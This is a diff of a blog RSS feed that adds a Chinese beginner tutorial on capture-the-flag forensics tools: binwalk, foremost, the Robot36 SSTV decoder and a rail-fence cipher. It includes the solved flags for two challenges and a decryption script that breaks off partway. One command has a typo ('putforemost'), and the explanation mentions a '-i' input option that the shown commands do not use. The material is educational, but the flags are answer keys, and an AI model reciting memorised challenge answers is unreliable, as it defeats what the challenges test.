@@ -7,7 +7,7 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
         <copyright>Retr0</copyright>
-        <lastBuildDate>Wed, 25 Feb 2026 23:23:53 +0800</lastBuildDate><atom:link href="https://www.retr0.xyz/post/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Thu, 05 Mar 2026 23:11:41 +0800</lastBuildDate><atom:link href="https://www.retr0.xyz/post/index.xml" rel="self" type="application/rss+xml" /><item>
         <title>《Clannad》系列 10/10：苦乐交奏的人生乐章</title>
         <link>https://www.retr0.xyz/p/clannad%E7%B3%BB%E5%88%97-10/10%E8%8B%A6%E4%B9%90%E4%BA%A4%E5%A5%8F%E7%9A%84%E4%BA%BA%E7%94%9F%E4%B9%90%E7%AB%A0/</link>
         <pubDate>Wed, 04 Feb 2026 12:48:17 +0800</pubDate>
@@ -85,6 +85,559 @@
 &lt;p&gt;纵使相逢应不识，尘满面，鬓如霜。&lt;/p&gt;
 &lt;p&gt;夜来幽梦忽还乡，小轩窗，正梳妆。相顾无言，惟有泪千行。&lt;/p&gt;
 &lt;p&gt;料得年年肠断处，明月夜，短松冈。&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>2. 部分软件的使用</title>
+        <link>https://www.retr0.xyz/p/2.-%E9%83%A8%E5%88%86%E8%BD%AF%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/</link>
+        <pubDate>Thu, 05 Mar 2026 23:11:41 +0800</pubDate>
+        
+        <guid>https://www.retr0.xyz/p/2.-%E9%83%A8%E5%88%86%E8%BD%AF%E4%BB%B6%E7%9A%84%E4%BD%BF%E7%94%A8/</guid>
+        <description>&lt;h2 id=&#34;binwalk&#34;&gt;binwalk
+&lt;/h2&gt;&lt;h3 id=&#34;介绍&#34;&gt;介绍
+&lt;/h3&gt;&lt;p&gt;binwalk可以用于扫描文件中是否包含有隐藏文件并将其提取出来，常用指令如：&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;扫描文件：&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;binwalk abc.png
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;strong&gt;自动提取隐藏文件（提取字节流）：&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;binwalk -e abc.png
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;strong&gt;自动提取指定格式文件（推荐）：&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;binwalk -e abc.png --dd&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;png&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;foremost&#34;&gt;foremost
+&lt;/h2&gt;&lt;h3 id=&#34;介绍-1&#34;&gt;介绍
+&lt;/h3&gt;&lt;p&gt;相较于binwalk，foremost更注重于隐藏文件的提取，效果也更好一些，使用之前可能需要先使用&lt;code&gt;apt&lt;/code&gt;进行安装&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo apt install foremost
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;常用命令：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;putforemost file.bin -t png -o out
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;其中：&lt;code&gt;-i&lt;/code&gt;指定输入文件，&lt;code&gt;-o&lt;/code&gt;指定输出目录（必须是空目录），&lt;code&gt;-t&lt;/code&gt;只提取指定类型&lt;/p&gt;
+&lt;h3 id=&#34;例题deskpng&#34;&gt;例题：deskpng
+&lt;/h3&gt;&lt;p&gt;使用binwalk扫描确定包含有隐藏文件，遂使用foremost提取：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;foremost desk.png -t png -o out
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;得到flag为：&lt;code&gt;flag{your_journey_to_hacking_starts_here}&lt;/code&gt;&lt;/p&gt;
+&lt;h2 id=&#34;robot36&#34;&gt;Robot36
+&lt;/h2&gt;&lt;h3 id=&#34;介绍-2&#34;&gt;介绍
+&lt;/h3&gt;&lt;p&gt;SSTV 慢扫描电视是一种图片转音频技术，常用在无线电等情境下，例如气象卫星向船只发送气象图等。&lt;/p&gt;
+&lt;p&gt;建议使用手机版&lt;/p&gt;
+&lt;h3 id=&#34;例题来自银河的信号&#34;&gt;例题：来自银河的信号
+&lt;/h3&gt;&lt;!-- 这是一张图片，ocr 内容为： --&gt;
+&lt;p&gt;&lt;img src=&#34;https://free.picui.cn/free/2026/03/05/69a99c5a51420.jpg&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;目视得到字符串&lt;code&gt;f7liavga{1M_0105n_cC@okmei_nFge!s}&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;对其进行栅栏密码解密，当每组字符数为17时可得flag为&lt;code&gt;flag{M00nc@ke_Fes7iva1_15_Coming!}&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;可用下面的脚本跑一下：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;  1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 25
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 26
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 27
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 28
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 29
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 30
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 31
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 32
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 33
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 34
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 35
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 36
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 37
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 38
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 39
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 40
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 41
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 42
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 43
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 44
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 45
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 46
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 47
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 48
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 49
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 50
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 51
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 52
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 53
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 54
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 55
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 56
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 57
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 58
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 59
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 60
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 61
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 62
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 63
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 64
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 65
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 66
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 67
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 68
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 69
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 70
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 71
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 72
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 73
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 74
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 75
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 76
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 77
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 78
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 79
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 80
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 81
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 82
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 83
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 84
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 85
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 86
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 87
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 88
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 89
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 90
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 91
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 92
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 93
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 94
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 95
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 96
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 97
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 98
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 99
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;100
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;101
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;102
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;103
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;104
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;105
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;106
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;107
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;108
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;109
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;110
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;111
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;112
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;113
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;114
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;115
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;116
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;rail_fence_by_rows&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ciphertext&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;key_rows&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&amp;#34;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;    按行数（传统栅栏密码）解密（锯齿形排列）
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;    :param ciphertext: 密文字符串
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;    :param key_rows: 行数/栏数
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;    :return: 明文
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;    &amp;#34;&amp;#34;&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;not&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ciphertext&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;or&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;key_rows&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;# 构建字符对应的行位置模板&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;rail_pattern&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;current_row&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;direction&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;# 1=向下，-1=向上&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;_&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ciphertext&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)):&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;rail_pattern&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;append&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;current_row&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;current_row&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;n&#34;&gt;direction&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;elif&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;current_row&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;key_rows&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;n&#34;&gt;direction&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;current_row&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;direction&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;# 按行分组密文&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;rows&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[[]&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;_&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;key_rows&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;idx&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;row&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;key_rows&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;count&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;rail_pattern&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;count&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;row&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
